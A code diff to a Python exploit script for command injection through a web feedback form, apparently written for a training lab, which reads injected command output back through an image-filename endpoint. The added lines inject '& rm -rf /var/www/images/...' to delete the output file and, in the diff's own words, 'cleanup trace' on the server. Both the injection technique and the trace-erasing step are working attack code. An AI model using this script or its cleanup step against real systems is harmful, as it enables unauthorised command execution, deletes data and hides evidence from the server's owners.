@@ -53,7 +53,7 @@ def exploit_command_injection(s, url, payload, output_file):
     logging.debug(f'Injecting command: {data}')
     res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
 
-    # Check if it's possible to read the output.txt file created
+    # Read the command result from the output file created
     output_path = f'/image?filename={output_file}'
     res2 = s.get(url + output_path, verify=False, proxies=proxies)
 
@@ -107,6 +107,9 @@ def main():
                 s = requests.Session()
                 output = exploit_command_injection(s, url, payload, output_file)
                 print(f'[Output]:\n{output}')
+                # Cleanup trace by deleting the file from the server
+                payload = f'& rm -rf /var/www/images/{output_file} #'
+                cleanup = exploit_command_injection(s, url, payload, output_file)
 
     logging.info('Session Finished')
     end_time = timer()
